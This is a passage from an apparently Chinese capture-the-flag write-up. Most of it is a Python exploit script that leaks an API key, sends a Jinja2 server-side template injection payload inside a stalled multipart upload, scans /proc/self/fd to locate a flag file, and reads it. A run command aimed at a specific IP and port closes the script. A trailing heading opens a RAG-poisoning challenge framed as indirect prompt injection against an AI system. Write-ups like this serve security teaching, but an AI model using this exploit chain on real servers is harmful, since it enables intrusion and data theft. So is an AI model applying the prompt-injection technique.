+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">base_url</span> <span class="o">=</span> <span class="n">parse_host_port</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">target</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Target: </span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">api_key</span> <span class="o">=</span> <span class="n">leak_api_key</span><span class="p">(</span><span class="n">base_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] API key: </span><span class="si">{</span><span class="n">api_key</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">boundary</span> <span class="o">=</span> <span class="s2">&#34;----codexpoc7MA4YWxkTrZu0gW&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">injected_template</span> <span class="o">=</span> <span class="s2">&#34;{{ cycler.__init__.__globals__.os.listdir(&#39;/&#39;) }}</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">body</span> <span class="o">=</span> <span class="n">build_large_multipart</span><span class="p">(</span><span class="n">boundary</span><span class="p">,</span> <span class="n">injected_template</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">pad_size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">upload_thread</span><span class="p">,</span> <span class="n">upload_state</span> <span class="o">=</span> <span class="n">hold_large_upload</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">host</span><span class="o">=</span><span class="n">host</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">port</span><span class="o">=</span><span class="n">port</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">body</span><span class="o">=</span><span class="n">body</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">boundary</span><span class="o">=</span><span class="n">boundary</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">hold_after</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">hold_after</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">hold_seconds</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">hold_seconds</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">wait_until</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">5</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="ow">not</span> <span class="n">upload_state</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;first_chunk_sent&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">&gt;</span> <span class="n">wait_until</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;upload did not start: </span><span class="si">{</span><span class="n">upload_state</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Large multipart upload in progress, scanning /proc/self/fd/* ...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag_file</span><span class="p">,</span> <span class="n">hit_fd</span> <span class="o">=</span> <span class="n">find_flag_filename</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">base_url</span><span class="o">=</span><span class="n">base_url</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">api_key</span><span class="o">=</span><span class="n">api_key</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fd_start</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">fd_start</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fd_end</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">fd_end</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">scan_rounds</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">scan_rounds</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Flag file: </span><span class="si">{</span><span class="n">flag_file</span><span class="si">}</span><span class="s2"> (via fd </span><span class="si">{</span><span class="n">hit_fd</span><span class="si">}</span><span class="s2">)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">read_flag</span><span class="p">(</span><span class="n">base_url</span><span class="p">,</span> <span class="n">api_key</span><span class="p">,</span> <span class="n">flag_file</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Flag: </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">upload_thread</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">upload_state</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[!] Upload thread error after success: </span><span class="si">{</span><span class="n">upload_state</span><span class="p">[</span><span class="s1">&#39;error&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># python3 exp.py 223.6.249.127:54789</span>
 </span></span></code></pre></div><h1 id="misc">Misc</h1>
 <h2 id="rag投毒挑战">RAG投毒挑战</h2>
 <p>本质上是基于RAG的间接提示注入攻击</p>
